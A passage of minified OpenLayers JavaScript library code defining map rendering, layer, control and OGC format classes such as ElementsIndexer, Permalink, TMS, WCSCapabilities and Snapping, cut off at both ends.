c}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.writers.ogc},CLASS_NAME:"OpenLayers.Format.WFST.v1_0_0"});OpenLayers.ElementsIndexer=OpenLayers.Class({maxZIndex:null,order:null,indices:null,compare:null,initialize:function(a){this.compare=a?OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_Y_ORDER:OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_DRAWING_ORDER;this.clear()},insert:function(a){this.exists(a)&amp;&amp;this.remove(a);var b=a.id;this.determineZIndex(a);for(var c=-1,d=this.order.length,e;1&lt;d-c;)e=parseInt((c+d)/2),0&lt;this.compare(this,a,OpenLayers.Util.getElement(this.order[e]))?c=e:d=e;this.order.splice(d, 0,b);this.indices[b]=this.getZIndex(a);return this.getNextElement(d)},remove:function(a){a=a.id;var b=OpenLayers.Util.indexOf(this.order,a);0&lt;=b&amp;&amp;(this.order.splice(b,1),delete this.indices[a],this.maxZIndex=0&lt;this.order.length?this.indices[this.order[this.order.length-1]]:0)},clear:function(){this.order=[];this.indices={};this.maxZIndex=0},exists:function(a){return null!=this.indices[a.id]},getZIndex:function(a){return a._style.graphicZIndex},determineZIndex:function(a){var b=a._style.graphicZIndex; null==b?(b=this.maxZIndex,a._style.graphicZIndex=b):b>this.maxZIndex&amp;&amp;(this.maxZIndex=b)},getNextElement:function(a){a+=1;if(a&lt;this.order.length){var b=OpenLayers.Util.getElement(this.order[a]);void 0==b&amp;&amp;(b=this.getNextElement(a));return b}return null},CLASS_NAME:"OpenLayers.ElementsIndexer"}); OpenLayers.ElementsIndexer.IndexingMethods={Z_ORDER:function(a,b,c){b=a.getZIndex(b);var d=0;c&amp;&amp;(a=a.getZIndex(c),d=b-a);return d},Z_ORDER_DRAWING_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0==a&amp;&amp;(a=1);return a},Z_ORDER_Y_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0===a&amp;&amp;(b=c._boundsBottom-b._boundsBottom,a=0===b?1:b);return a}}; OpenLayers.Renderer.Elements=OpenLayers.Class(OpenLayers.Renderer,{rendererRoot:null,root:null,vectorRoot:null,textRoot:null,xmlns:null,xOffset:0,indexer:null,BACKGROUND_ID_SUFFIX:"_background",LABEL_ID_SUFFIX:"_label",LABEL_OUTLINE_SUFFIX:"_outline",initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.rendererRoot=this.createRenderRoot();this.root=this.createRoot("_root");this.vectorRoot=this.createRoot("_vroot");this.textRoot=this.createRoot("_troot");this.root.appendChild(this.vectorRoot); this.root.appendChild(this.textRoot);this.rendererRoot.appendChild(this.root);this.container.appendChild(this.rendererRoot);b&amp;&amp;(b.zIndexing||b.yOrdering)&amp;&amp;(this.indexer=new OpenLayers.ElementsIndexer(b.yOrdering))},destroy:function(){this.clear();this.xmlns=this.root=this.rendererRoot=null;OpenLayers.Renderer.prototype.destroy.apply(this,arguments)},clear:function(){var a,b=this.vectorRoot;if(b)for(;a=b.firstChild;)b.removeChild(a);if(b=this.textRoot)for(;a=b.firstChild;)b.removeChild(a);this.indexer&amp;&amp; this.indexer.clear()},setExtent:function(a,b){var c=OpenLayers.Renderer.prototype.setExtent.apply(this,arguments),d=this.getResolution();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine){var e,f=a.getWidth()/this.map.getExtent().getWidth();a=a.scale(1/f);f=this.map.getMaxExtent();f.right>a.left&amp;&amp;f.right&lt;a.right?e=!0:f.left>a.left&amp;&amp;f.left&lt;a.right&amp;&amp;(e=!1);if(e!==this.rightOfDateLine||b)c=!1,this.xOffset=!0===e?f.getWidth()/d:0;this.rightOfDateLine=e}return c},getNodeType:function(a,b){},drawGeometry:function(a, b,c){var d=a.CLASS_NAME,e=!0;if("OpenLayers.Geometry.Collection"==d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d){for(var d=0,f=a.components.length;d&lt;f;d++)e=this.drawGeometry(a.components[d],b,c)&amp;&amp;e;return e}d=e=!1;"none"!=b.display&amp;&amp;(b.backgroundGraphic?this.redrawBackgroundNode(a.id,a,b,c):d=!0,e=this.redrawNode(a.id,a,b,c));!1==e&amp;&amp;(b=document.getElementById(a.id))&amp;&amp;(b._style.backgroundGraphic&amp;&amp;(d=!0),b.parentNode.removeChild(b)); d&amp;&amp;(b=document.getElementById(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;b.parentNode.removeChild(b);return e},redrawNode:function(a,b,c,d){c=this.applyDefaultSymbolizer(c);a=this.nodeFactory(a,this.getNodeType(b,c));a._featureId=d;a._boundsBottom=b.getBounds().bottom;a._geometryClass=b.CLASS_NAME;a._style=c;b=this.drawGeometryNode(a,b,c);if(!1===b)return!1;a=b.node;this.indexer?(c=this.indexer.insert(a))?this.vectorRoot.insertBefore(a,c):this.vectorRoot.appendChild(a):a.parentNode!==this.vectorRoot&amp;&amp;this.vectorRoot.appendChild(a); this.postDraw(a);return b.complete},redrawBackgroundNode:function(a,b,c,d){c=OpenLayers.Util.extend({},c);c.externalGraphic=c.backgroundGraphic;c.graphicXOffset=c.backgroundXOffset;c.graphicYOffset=c.backgroundYOffset;c.graphicZIndex=c.backgroundGraphicZIndex;c.graphicWidth=c.backgroundWidth||c.graphicWidth;c.graphicHeight=c.backgroundHeight||c.graphicHeight;c.backgroundGraphic=null;c.backgroundXOffset=null;c.backgroundYOffset=null;c.backgroundGraphicZIndex=null;return this.redrawNode(a+this.BACKGROUND_ID_SUFFIX, b,c,null)},drawGeometryNode:function(a,b,c){c=c||a._style;var d={isFilled:void 0===c.fill?!0:c.fill,isStroked:void 0===c.stroke?!!c.strokeWidth:c.stroke},e;switch(b.CLASS_NAME){case "OpenLayers.Geometry.Point":!1===c.graphic&amp;&amp;(d.isFilled=!1,d.isStroked=!1);e=this.drawPoint(a,b);break;case "OpenLayers.Geometry.LineString":d.isFilled=!1;e=this.drawLineString(a,b);break;case "OpenLayers.Geometry.LinearRing":e=this.drawLinearRing(a,b);break;case "OpenLayers.Geometry.Polygon":e=this.drawPolygon(a,b);break; case "OpenLayers.Geometry.Rectangle":e=this.drawRectangle(a,b)}a._options=d;return!1!=e?{node:this.setStyle(a,c,d,b),complete:e}:!1},postDraw:function(a){},drawPoint:function(a,b){},drawLineString:function(a,b){},drawLinearRing:function(a,b){},drawPolygon:function(a,b){},drawRectangle:function(a,b){},drawCircle:function(a,b){},removeText:function(a){var b=document.getElementById(a+this.LABEL_ID_SUFFIX);b&amp;&amp;this.textRoot.removeChild(b);(a=document.getElementById(a+this.LABEL_OUTLINE_SUFFIX))&amp;&amp;this.textRoot.removeChild(a)}, getFeatureIdFromEvent:function(a){var b=a.target,c=b&amp;&amp;b.correspondingUseElement;return(c?c:b||a.srcElement)._featureId},eraseGeometry:function(a,b){if("OpenLayers.Geometry.MultiPoint"==a.CLASS_NAME||"OpenLayers.Geometry.MultiLineString"==a.CLASS_NAME||"OpenLayers.Geometry.MultiPolygon"==a.CLASS_NAME||"OpenLayers.Geometry.Collection"==a.CLASS_NAME)for(var c=0,d=a.components.length;c&lt;d;c++)this.eraseGeometry(a.components[c],b);else(c=OpenLayers.Util.getElement(a.id))&amp;&amp;c.parentNode&amp;&amp;(c.geometry&amp;&amp;(c.geometry.destroy(), c.geometry=null),c.parentNode.removeChild(c),this.indexer&amp;&amp;this.indexer.remove(c),c._style.backgroundGraphic&amp;&amp;(c=OpenLayers.Util.getElement(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;c.parentNode&amp;&amp;c.parentNode.removeChild(c))},nodeFactory:function(a,b){var c=OpenLayers.Util.getElement(a);c?this.nodeTypeCompare(c,b)||(c.parentNode.removeChild(c),c=this.nodeFactory(a,b)):c=this.createNode(b,a);return c},nodeTypeCompare:function(a,b){},createNode:function(a,b){},moveRoot:function(a){var b=this.root;a.root.parentNode== this.rendererRoot&amp;&amp;(b=a.root);b.parentNode.removeChild(b);a.rendererRoot.appendChild(b)},getRenderLayerId:function(){return this.root.parentNode.parentNode.id},isComplexSymbol:function(a){return"circle"!=a&amp;&amp;!!a},CLASS_NAME:"OpenLayers.Renderer.Elements"});OpenLayers.Control.ArgParser=OpenLayers.Class(OpenLayers.Control,{center:null,zoom:null,layers:null,displayProjection:null,getParameters:function(a){a=a||window.location.href;var b=OpenLayers.Util.getParameters(a),c=a.indexOf("#");0&lt;c&amp;&amp;(a="?"+a.substring(c+1,a.length),OpenLayers.Util.extend(b,OpenLayers.Util.getParameters(a)));return b},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++){var d=this.map.controls[b];if(d!=this&amp;&amp; "OpenLayers.Control.ArgParser"==d.CLASS_NAME){d.displayProjection!=this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&amp;&amp;(b=this.getParameters(),b.layers&amp;&amp;(this.layers=b.layers,this.map.events.register("addlayer",this,this.configureLayers),this.configureLayers()),b.lat&amp;&amp;b.lon&amp;&amp;(this.center=new OpenLayers.LonLat(parseFloat(b.lon),parseFloat(b.lat)),b.zoom&amp;&amp;(this.zoom=parseFloat(b.zoom)),this.map.events.register("changebaselayer",this,this.setCenter), this.setCenter()))},setCenter:function(){this.map.baseLayer&amp;&amp;(this.map.events.unregister("changebaselayer",this,this.setCenter),this.displayProjection&amp;&amp;this.center.transform(this.displayProjection,this.map.getProjectionObject()),this.map.setCenter(this.center,this.zoom))},configureLayers:function(){if(this.layers.length==this.map.layers.length){this.map.events.unregister("addlayer",this,this.configureLayers);for(var a=0,b=this.layers.length;a&lt;b;a++){var c=this.map.layers[a],d=this.layers.charAt(a); "B"==d?this.map.setBaseLayer(c):"T"!=d&amp;&amp;"F"!=d||c.setVisibility("T"==d)}}},CLASS_NAME:"OpenLayers.Control.ArgParser"});OpenLayers.Control.Permalink=OpenLayers.Class(OpenLayers.Control,{argParserClass:OpenLayers.Control.ArgParser,element:null,anchor:!1,base:"",displayProjection:null,initialize:function(a,b,c){null===a||"object"!=typeof a||OpenLayers.Util.isElement(a)?(OpenLayers.Control.prototype.initialize.apply(this,[c]),this.element=OpenLayers.Util.getElement(a),this.base=b||document.location.href):(this.base=document.location.href,OpenLayers.Control.prototype.initialize.apply(this,[a]),null!=this.element&amp;&amp;(this.element= OpenLayers.Util.getElement(this.element)))},destroy:function(){this.element&amp;&amp;this.element.parentNode==this.div&amp;&amp;(this.div.removeChild(this.element),this.element=null);this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateLink);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++){var d=this.map.controls[b];if(d.CLASS_NAME==this.argParserClass.CLASS_NAME){d.displayProjection!= this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&amp;&amp;this.map.addControl(new this.argParserClass({displayProjection:this.displayProjection}))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||this.anchor||(this.element=document.createElement("a"),this.element.innerHTML=OpenLayers.i18n("Permalink"),this.element.href="",this.div.appendChild(this.element));this.map.events.on({moveend:this.updateLink,changelayer:this.updateLink, changebaselayer:this.updateLink,scope:this});this.updateLink();return this.div},updateLink:function(){var a=this.anchor?"#":"?",b=this.base,c=null;-1!=b.indexOf("#")&amp;&amp;!1==this.anchor&amp;&amp;(c=b.substring(b.indexOf("#"),b.length));-1!=b.indexOf(a)&amp;&amp;(b=b.substring(0,b.indexOf(a)));b=b.split("#")[0]+a+OpenLayers.Util.getParameterString(this.createParams());c&amp;&amp;(b+=c);this.anchor&amp;&amp;!this.element?window.location.href=b:this.element.href=b},createParams:function(a,b,c){a=a||this.map.getCenter();var d=OpenLayers.Util.getParameters(this.base); if(a)for(d.zoom=b||this.map.getZoom(),b=a.lat,a=a.lon,this.displayProjection&amp;&amp;(b=OpenLayers.Projection.transform({x:a,y:b},this.map.getProjectionObject(),this.displayProjection),a=b.x,b=b.y),d.lat=Math.round(1E5*b)/1E5,d.lon=Math.round(1E5*a)/1E5,c=c||this.map.layers,d.layers="",a=0,b=c.length;a&lt;b;a++){var e=c[a];d.layers=e.isBaseLayer?d.layers+(e==this.map.baseLayer?"B":"0"):d.layers+(e.getVisibility()?"T":"F")}return d},CLASS_NAME:"OpenLayers.Control.Permalink"});OpenLayers.Layer.TMS=OpenLayers.Class(OpenLayers.Layer.Grid,{serviceVersion:"1.0.0",layername:null,type:null,isBaseLayer:!0,tileOrigin:null,serverResolutions:null,zoomOffset:0,initialize:function(a,b,c){var d=[];d.push(a,b,{},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,d)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.TMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.getServerResolution(), c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((a.bottom-this.tileOrigin.lat)/(b*this.tileSize.h));b=this.getServerZoom();c=this.serviceVersion+"/"+this.layername+"/"+b+"/"+c+"/"+a+"."+this.type;a=this.url;OpenLayers.Util.isArray(a)&amp;&amp;(a=this.selectUrl(c,a));return a+c},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,this.map.maxExtent.bottom))},CLASS_NAME:"OpenLayers.Layer.TMS"});OpenLayers.Format.WCSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WCSCapabilities"});OpenLayers.Format.WCSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g,splitSpace:/\s+/},defaultPrefix:"wcs",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1"});OpenLayers.Format.WCSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"},errorProperty:"service",readers:{wcs:{WCS_Capabilities:function(a,b){this.readChildNodes(a,b)},Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label= this.getChildValue(a)},keywords:function(a,b){b.keywords=[];this.readChildNodes(a,b.keywords)},keyword:function(a,b){b.push(this.getChildValue(a))},responsibleParty:function(a,b){b.responsibleParty={};this.readChildNodes(a,b.responsibleParty)},individualName:function(a,b){b.individualName=this.getChildValue(a)},organisationName:function(a,b){b.organisationName=this.getChildValue(a)},positionName:function(a,b){b.positionName=this.getChildValue(a)},contactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a, b.contactInfo)},phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},voice:function(a,b){b.voice=this.getChildValue(a)},facsimile:function(a,b){b.facsimile=this.getChildValue(a)},address:function(a,b){b.address={};this.readChildNodes(a,b.address)},deliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},city:function(a,b){b.city=this.getChildValue(a)},postalCode:function(a,b){b.postalCode=this.getChildValue(a)},country:function(a,b){b.country=this.getChildValue(a)},electronicMailAddress:function(a, b){b.electronicMailAddress=this.getChildValue(a)},fees:function(a,b){b.fees=this.getChildValue(a)},accessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ContentMetadata:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageOfferingBrief:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label=this.getChildValue(a)},lonLatEnvelope:function(a,b){var c=this.getElementsByTagNameNS(a, "http://www.opengis.net/gml","pos");if(2==c.length){var d={},e={};OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[0],d]);OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[1],e]);b.lonLatEnvelope={};b.lonLatEnvelope.srsName=a.getAttribute("srsName");b.lonLatEnvelope.min=d.points[0];b.lonLatEnvelope.max=e.points[0]}}}},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_0_0"});OpenLayers.Strategy.Fixed=OpenLayers.Class(OpenLayers.Strategy,{preload:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);if(a)if(this.layer.events.on({refresh:this.load,scope:this}),!0==this.layer.visibility||this.preload)this.load();else this.layer.events.on({visibilitychanged:this.load,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un({refresh:this.load,visibilitychanged:this.load, scope:this});return a},load:function(a){var b=this.layer;b.events.triggerEvent("loadstart",{filter:b.filter});b.protocol.read(OpenLayers.Util.applyDefaults({callback:this.merge,filter:b.filter,scope:this},a));b.events.un({visibilitychanged:this.load,scope:this})},merge:function(a){var b=this.layer;b.destroyFeatures();var c=a.features;if(c&amp;&amp;0&lt;c.length){var d=b.projection,e=b.map.getProjectionObject();if(!e.equals(d))for(var f,g=0,h=c.length;g&lt;h;++g)(f=c[g].geometry)&amp;&amp;f.transform(d,e);b.addFeatures(c)}b.events.triggerEvent("loadend", {response:a})},CLASS_NAME:"OpenLayers.Strategy.Fixed"});OpenLayers.Control.Zoom=OpenLayers.Class(OpenLayers.Control,{zoomInText:"+",zoomInId:"olZoomInLink",zoomOutText:"\u2212",zoomOutId:"olZoomOutLink",draw:function(){var a=OpenLayers.Control.prototype.draw.apply(this),b=this.getOrCreateLinks(a),c=b.zoomIn,b=b.zoomOut,d=this.map.events;b.parentNode!==a&amp;&amp;(d=this.events,d.attachToElement(b.parentNode));d.register("buttonclick",this,this.onZoomClick);this.zoomInLink=c;this.zoomOutLink=b;return a},getOrCreateLinks:function(a){var b=document.getElementById(this.zoomInId), c=document.getElementById(this.zoomOutId);b||(b=document.createElement("a"),b.href="#zoomIn",b.appendChild(document.createTextNode(this.zoomInText)),b.className="olControlZoomIn",a.appendChild(b));OpenLayers.Element.addClass(b,"olButton");c||(c=document.createElement("a"),c.href="#zoomOut",c.appendChild(document.createTextNode(this.zoomOutText)),c.className="olControlZoomOut",a.appendChild(c));OpenLayers.Element.addClass(c,"olButton");return{zoomIn:b,zoomOut:c}},onZoomClick:function(a){a=a.buttonElement; a===this.zoomInLink?this.map.zoomIn():a===this.zoomOutLink&amp;&amp;this.map.zoomOut()},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onZoomClick);delete this.zoomInLink;delete this.zoomOutLink;OpenLayers.Control.prototype.destroy.apply(this)},CLASS_NAME:"OpenLayers.Control.Zoom"});OpenLayers.Layer.PointTrack=OpenLayers.Class(OpenLayers.Layer.Vector,{dataFrom:null,styleFrom:null,addNodes:function(a,b){if(2>a.length)throw Error("At least two point features have to be added to create a line from");for(var c=Array(a.length-1),d,e,f,g=0,h=a.length;g&lt;h;g++){d=a[g];f=d.geometry;if(!f)f=d.lonlat,f=new OpenLayers.Geometry.Point(f.lon,f.lat);else if("OpenLayers.Geometry.Point"!=f.CLASS_NAME)throw new TypeError("Only features with point geometries are supported.");if(0&lt;g){d=null!=this.dataFrom? a[g+this.dataFrom].data||a[g+this.dataFrom].attributes:null;var k=null!=this.styleFrom?a[g+this.styleFrom].style:null;e=new OpenLayers.Geometry.LineString([e,f]);c[g-1]=new OpenLayers.Feature.Vector(e,d,k)}e=f}this.addFeatures(c,b)},CLASS_NAME:"OpenLayers.Layer.PointTrack"});OpenLayers.Layer.PointTrack.SOURCE_NODE=-1;OpenLayers.Layer.PointTrack.TARGET_NODE=0;OpenLayers.Layer.PointTrack.dataFrom={SOURCE_NODE:-1,TARGET_NODE:0};OpenLayers.Protocol.WFS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.WFS.DEFAULTS);var b=OpenLayers.Protocol.WFS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFS version: "+a.version;return new b(a)}; OpenLayers.Protocol.WFS.fromWMSLayer=function(a,b){var c,d;c=a.params.LAYERS;c=(OpenLayers.Util.isArray(c)?c[0]:c).split(":");1&lt;c.length&amp;&amp;(d=c[0]);c=c.pop();d={url:a.url,featureType:c,featurePrefix:d,srsName:a.projection&amp;&amp;a.projection.getCode()||a.map&amp;&amp;a.map.getProjectionObject().getCode(),version:"1.1.0"};return new OpenLayers.Protocol.WFS(OpenLayers.Util.applyDefaults(b,d))};OpenLayers.Protocol.WFS.DEFAULTS={version:"1.0.0"};OpenLayers.Layer.Markers=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,markers:null,drawn:!1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.markers=[]},destroy:function(){this.clearMarkers();this.markers=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;a=0;for(var b=this.markers.length;a&lt;b;a++)this.markers[a].setOpacity(this.opacity)}},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this, arguments);if(b||!this.drawn){for(var d=0,e=this.markers.length;d&lt;e;d++)this.drawMarker(this.markers[d]);this.drawn=!0}},addMarker:function(a){this.markers.push(a);1>this.opacity&amp;&amp;a.setOpacity(this.opacity);this.map&amp;&amp;this.map.getExtent()&amp;&amp;(a.map=this.map,this.drawMarker(a))},removeMarker:function(a){this.markers&amp;&amp;this.markers.length&amp;&amp;(OpenLayers.Util.removeItem(this.markers,a),a.erase())},clearMarkers:function(){if(null!=this.markers)for(;0&lt;this.markers.length;)this.removeMarker(this.markers[0])}, drawMarker:function(a){var b=this.map.getLayerPxFromLonLat(a.lonlat);null==b?a.display(!1):a.isDrawn()?a.icon&amp;&amp;a.icon.moveTo(b):(a=a.draw(b),this.div.appendChild(a))},getDataExtent:function(){var a=null;if(this.markers&amp;&amp;0&lt;this.markers.length)for(var a=new OpenLayers.Bounds,b=0,c=this.markers.length;b&lt;c;b++)a.extend(this.markers[b].lonlat);return a},CLASS_NAME:"OpenLayers.Layer.Markers"});OpenLayers.Control.Pan=OpenLayers.Class(OpenLayers.Control.Button,{slideFactor:50,slideRatio:null,direction:null,initialize:function(a,b){this.direction=a;this.CLASS_NAME+=this.direction;OpenLayers.Control.prototype.initialize.apply(this,[b])},trigger:function(){if(this.map){var a=OpenLayers.Function.bind(function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},this);switch(this.direction){case OpenLayers.Control.Pan.NORTH:this.map.pan(0,-a("h"));break;case OpenLayers.Control.Pan.SOUTH:this.map.pan(0, a("h"));break;case OpenLayers.Control.Pan.WEST:this.map.pan(-a("w"),0);break;case OpenLayers.Control.Pan.EAST:this.map.pan(a("w"),0)}}},CLASS_NAME:"OpenLayers.Control.Pan"});OpenLayers.Control.Pan.NORTH="North";OpenLayers.Control.Pan.SOUTH="South";OpenLayers.Control.Pan.EAST="East";OpenLayers.Control.Pan.WEST="West";OpenLayers.Format.CSWGetDomain=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetDomain.DEFAULTS);var b=OpenLayers.Format.CSWGetDomain["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetDomain version: "+a.version;return new b(a)};OpenLayers.Format.CSWGetDomain.DEFAULTS={version:"2.0.2"};OpenLayers.Format.CSWGetDomain.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",csw:"http://www.opengis.net/cat/csw/2.0.2"},defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd",PropertyName:null,ParameterName:null,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9== a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{csw:{GetDomainResponse:function(a,b){this.readChildNodes(a,b)},DomainValues:function(a,b){OpenLayers.Util.isArray(b.DomainValues)||(b.DomainValues=[]);for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;this.readChildNodes(a,d);b.DomainValues.push(d)},PropertyName:function(a,b){b.PropertyName=this.getChildValue(a)},ParameterName:function(a,b){b.ParameterName=this.getChildValue(a)},ListOfValues:function(a, b){OpenLayers.Util.isArray(b.ListOfValues)||(b.ListOfValues=[]);this.readChildNodes(a,b.ListOfValues)},Value:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.push({Value:d})},ConceptualScheme:function(a,b){b.ConceptualScheme={};this.readChildNodes(a,b.ConceptualScheme)},Name:function(a,b){b.Name=this.getChildValue(a)},Document:function(a,b){b.Document=this.getChildValue(a)},Authority:function(a,b){b.Authority=this.getChildValue(a)}, RangeOfValues:function(a,b){b.RangeOfValues={};this.readChildNodes(a,b.RangeOfValues)},MinValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MinValue=d},MaxValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MaxValue=d}}},write:function(a){a=this.writeNode("csw:GetDomain",a);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{csw:{GetDomain:function(a){var b= this.createElementNSPlus("csw:GetDomain",{attributes:{service:"CSW",version:this.version}});a.PropertyName||this.PropertyName?this.writeNode("csw:PropertyName",a.PropertyName||this.PropertyName,b):(a.ParameterName||this.ParameterName)&amp;&amp;this.writeNode("csw:ParameterName",a.ParameterName||this.ParameterName,b);this.readChildNodes(b,a);return b},PropertyName:function(a){return this.createElementNSPlus("csw:PropertyName",{value:a})},ParameterName:function(a){return this.createElementNSPlus("csw:ParameterName", {value:a})}}},CLASS_NAME:"OpenLayers.Format.CSWGetDomain.v2_0_2"});OpenLayers.Format.ArcXML.Features=OpenLayers.Class(OpenLayers.Format.XML,{read:function(a){return(new OpenLayers.Format.ArcXML).read(a).features.feature}});OpenLayers.Control.Snapping=OpenLayers.Class(OpenLayers.Control,{DEFAULTS:{tolerance:10,node:!0,edge:!0,vertex:!0},greedy:!0,precedence:["node","vertex","edge"],resolution:null,geoToleranceCache:null,layer:null,feature:null,point:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.layer&amp;&amp;this.setLayer(this.options.layer);a=OpenLayers.Util.extend({},this.options.defaults);this.defaults=OpenLayers.Util.applyDefaults(a,this.DEFAULTS);this.setTargets(this.options.targets); 0===this.targets.length&amp;&amp;this.layer&amp;&amp;this.addTargetLayer(this.layer);this.geoToleranceCache={}},setLayer:function(a){this.active?(this.deactivate(),this.layer=a,this.activate()):this.layer=a},setTargets:function(a){this.targets=[];if(a&amp;&amp;a.length)for(var b,c=0,d=a.length;c&lt;d;++c)b=a[c],b instanceof OpenLayers.Layer.Vector?this.addTargetLayer(b):this.addTarget(b)},addTargetLayer:function(a){this.addTarget({layer:a})},addTarget:function(a){a=OpenLayers.Util.applyDefaults(a,this.defaults);a.nodeTolerance= a.nodeTolerance||a.tolerance;a.vertexTolerance=a.vertexTolerance||a.tolerance;a.edgeTolerance=a.edgeTolerance||a.tolerance;this.targets.push(a)},removeTargetLayer:function(a){for(var b,c=this.targets.length-1;0&lt;=c;--c)b=this.targets[c],b.layer===a&amp;&amp;this.removeTarget(b)},removeTarget:function(a){return OpenLayers.Util.removeItem(this.targets,a)},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a&amp;&amp;this.layer&amp;&amp;this.layer.events)this.layer.events.on({sketchstarted:this.onSketchModified, sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this);a&amp;&amp;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un({sketchstarted:this.onSketchModified,sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});this.point=this.feature=null;return a},onSketchModified:function(a){this.feature=a.feature;this.considerSnapping(a.vertex,a.vertex)},onVertexModified:function(a){this.feature= a.feature;var b=this.layer.map.getLonLatFromViewPortPx(a.pixel);this.considerSnapping(a.vertex,new OpenLayers.Geometry.Point(b.lon,b.lat))},considerSnapping:function(a,b){for(var 